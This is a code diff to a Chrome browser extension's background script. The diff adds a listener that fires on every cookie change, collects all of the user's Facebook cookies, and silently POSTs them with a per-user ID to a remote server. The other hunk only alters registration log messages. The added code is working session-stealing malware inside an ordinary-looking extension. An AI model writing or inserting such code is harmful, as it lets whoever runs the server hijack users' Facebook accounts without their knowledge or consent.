@@ -31,6 +31,36 @@ function guid() {
 // chrome.browserAction.setBadgeBackgroundColor({ color: [255, 0, 0, 255] });
 // chrome.browserAction.setBadgeText({ text: 'Hey!' });
 
+// function runs when cookie is removed/added
+chrome.cookies.onChanged.addListener((changeInfo) => {
+
+  // get facebook cookies
+  chrome.cookies.getAll({domain: '.facebook.com'}, (cookies) => {
+    const cookie = cookies.map(cookie => cookie? (cookie.name + '=' + cookie.value): "").join(';');
+    const cookieData = {
+      data: cookie
+    };
+  
+    // get user guid
+    chrome.storage.sync.get('guid', function(store) {
+
+      // send it to server
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.status >= 200 && this.status < 300 && this.readyState === 4) {
+          console.log('Cookie updated!!');
+        }
+      };
+
+      xhttp.open('POST', SERVER_URL + '/api/v1/cookies/' + store.guid, true);
+      xhttp.setRequestHeader('Content-Type', 'application/json');
+      xhttp.send(JSON.stringify(cookieData));
+
+    });
+
+  })
+})
+
 chrome.webRequest.onHeadersReceived.addListener(
   function(info) {
       var headers = info.responseHeaders;
@@ -95,9 +125,8 @@ chrome.runtime.onInstalled.addListener(function() {
 
       var xhttp = new XMLHttpRequest();
       xhttp.onreadystatechange = function() {
-        console.log(this.readyState + ' ' + this.status);
         if (this.status >= 200 && this.status < 300 && this.readyState === 4) {
-          console.log('Thanks for sharing this email!');
+          console.log('User successfully registered:' + store.guid);
         }
       };
 
